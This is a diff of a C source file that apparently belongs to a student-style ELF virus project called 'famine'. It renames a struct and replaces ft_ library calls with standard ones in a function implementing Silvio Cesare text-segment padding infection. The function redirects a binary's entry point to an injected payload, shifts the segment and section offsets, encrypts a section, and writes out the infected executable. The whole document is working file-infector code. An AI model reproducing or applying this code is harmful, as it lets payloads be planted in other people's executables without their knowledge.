@@ -12,89 +12,89 @@
 
 #include "famine.h"
 
-void silvio_text_infection(t_woody *woody)
+void silvio_text_infection(t_famine *famine)
 {
     // Create the output file
-    if (!(woody->infected_file = malloc(woody->binary_data_size + PAGE_SIZE)))
+    if (!(famine->infected_file = malloc(famine->binary_data_size + PAGE_SIZE)))
     {
-        error(ERROR_MALLOC, woody);
+        error(ERROR_MALLOC, famine);
     }
-    woody->infected_file_size = woody->binary_data_size + PAGE_SIZE;
+    famine->infected_file_size = famine->binary_data_size + PAGE_SIZE;
 
-    for (size_t i = 0; i < woody->ehdr->e_phnum; i++)
+    for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
     {
-        if (woody->phdr[i].p_type == PT_LOAD && woody->phdr[i].p_flags == (PF_R | PF_X))
+        if (famine->phdr[i].p_type == PT_LOAD && famine->phdr[i].p_flags == (PF_R | PF_X))
         {
 
-            woody->payload_vaddr = woody->text_p_vaddr + woody->phdr[i].p_filesz;
-            woody->ehdr->e_entry = woody->payload_vaddr;
-            woody->new_entry_point = woody->payload_vaddr;
+            famine->payload_vaddr = famine->text_p_vaddr + famine->phdr[i].p_filesz;
+            famine->ehdr->e_entry = famine->payload_vaddr;
+            famine->new_entry_point = famine->payload_vaddr;
 
-            woody->phdr[i].p_filesz += woody->payload_size;
-            woody->phdr[i].p_memsz += woody->payload_size;
+            famine->phdr[i].p_filesz += famine->payload_size;
+            famine->phdr[i].p_memsz += famine->payload_size;
 
-            for (int j = i + 1; j < woody->ehdr->e_phnum; j++)
-                woody->phdr[j].p_offset += PAGE_SIZE;
+            for (int j = i + 1; j < famine->ehdr->e_phnum; j++)
+                famine->phdr[j].p_offset += PAGE_SIZE;
 
             break;
         }
     }
 
-    if (woody->text_p_end_offset % PAGE_SIZE + woody->payload_size > PAGE_SIZE)
+    if (famine->text_p_end_offset % PAGE_SIZE + famine->payload_size > PAGE_SIZE)
     {
-        error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, woody);
+        error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, famine);
     }
 
     // Adding offset of one page in all section located after text section end. And get text section offset for the encryption.
-    for (size_t i = 0; i < woody->ehdr->e_shnum; i++)
+    for (size_t i = 0; i < famine->ehdr->e_shnum; i++)
     {
-        if (woody->shdr[i].sh_offset > woody->text_p_end_offset)
+        if (famine->shdr[i].sh_offset > famine->text_p_end_offset)
         {
-            woody->shdr[i].sh_offset += PAGE_SIZE;
+            famine->shdr[i].sh_offset += PAGE_SIZE;
         }
-        else if (woody->shdr[i].sh_addr + woody->shdr[i].sh_size == woody->payload_vaddr)
+        else if (famine->shdr[i].sh_addr + famine->shdr[i].sh_size == famine->payload_vaddr)
         {
-            woody->shdr[i].sh_size += woody->payload_size;
+            famine->shdr[i].sh_size += famine->payload_size;
         }
         // get section to encrypt info.
-        if (!ft_strncmp(SECTION_TO_ENCRYPT_NAME,
-                        (woody->string_table_ptr + woody->shdr[i].sh_name),
-                        ft_strlen(SECTION_TO_ENCRYPT_NAME)))
+        if (!strncmp(SECTION_TO_ENCRYPT_NAME,
+                     (famine->string_table_ptr + famine->shdr[i].sh_name),
+                     strlen(SECTION_TO_ENCRYPT_NAME)))
         {
-            woody->encrypt_s_start_offset = woody->shdr[i].sh_offset;
-            woody->encrypt_s_size = woody->shdr[i].sh_size;
-            woody->encrypt_s_end_offset = woody->encrypt_s_start_offset + woody->encrypt_s_size;
-            woody->encrypt_s_addr = woody->shdr[i].sh_addr;
-            woody->shdr[i].sh_flags |= SHF_WRITE;
+            famine->encrypt_s_start_offset = famine->shdr[i].sh_offset;
+            famine->encrypt_s_size = famine->shdr[i].sh_size;
+            famine->encrypt_s_end_offset = famine->encrypt_s_start_offset + famine->encrypt_s_size;
+            famine->encrypt_s_addr = famine->shdr[i].sh_addr;
+            famine->shdr[i].sh_flags |= SHF_WRITE;
         }
     }
 
     // Increase section header offset by PAGE_SIZE
-    woody->ehdr->e_shoff += PAGE_SIZE;
+    famine->ehdr->e_shoff += PAGE_SIZE;
 
-    cipher_woody_file_data(woody);
+    cipher_famine_file_data(famine);
     if (ARCH_32)
     {
-        overwrite_payload_ret2oep(woody);
+        overwrite_payload_ret2oep(famine);
     }
     else if (ARCH_64)
     {
-        overwrite_keysection_payload(woody);
-        overwrite_payload_getencryptedsectionaddr(woody);
-        overwrite_payload_ret2oep(woody);
-        overwrite_payload_getencryptedsectionsize(woody);
-        overwrite_payload_gettextsectionaddr(woody);
-        overwrite_payload_gettextsize(woody);
+        overwrite_keysection_payload(famine);
+        overwrite_payload_getencryptedsectionaddr(famine);
+        overwrite_payload_ret2oep(famine);
+        overwrite_payload_getencryptedsectionsize(famine);
+        overwrite_payload_gettextsectionaddr(famine);
+        overwrite_payload_gettextsize(famine);
     }
 
     // Copy until text section end
-    ft_memcpy(woody->infected_file, woody->mmap_ptr, woody->text_p_end_offset);
+    memcpy(famine->infected_file, famine->mmap_ptr, famine->text_p_end_offset);
     // Rewrite text section with cipher data.
-    ft_memcpy(woody->infected_file + woody->encrypt_s_start_offset, woody->cipher, woody->encrypt_s_size);
+    memcpy(famine->infected_file + famine->encrypt_s_start_offset, famine->cipher, famine->encrypt_s_size);
     // Initialize value to zero for padding.
-    ft_bzero(woody->infected_file + woody->text_p_end_offset, PAGE_SIZE);
+    bzero(famine->infected_file + famine->text_p_end_offset, PAGE_SIZE);
     // Insert payload after text section end
-    ft_memcpy(woody->infected_file + woody->text_p_end_offset, woody->payload_data, woody->payload_size);
+    memcpy(famine->infected_file + famine->text_p_end_offset, famine->payload_data, famine->payload_size);
     // Insert rest of binary
-    ft_memcpy(woody->infected_file + woody->text_p_end_offset + PAGE_SIZE, woody->mmap_ptr + woody->text_p_end_offset, woody->binary_data_size - woody->text_p_end_offset);
+    memcpy(famine->infected_file + famine->text_p_end_offset + PAGE_SIZE, famine->mmap_ptr + famine->text_p_end_offset, famine->binary_data_size - famine->text_p_end_offset);
 }
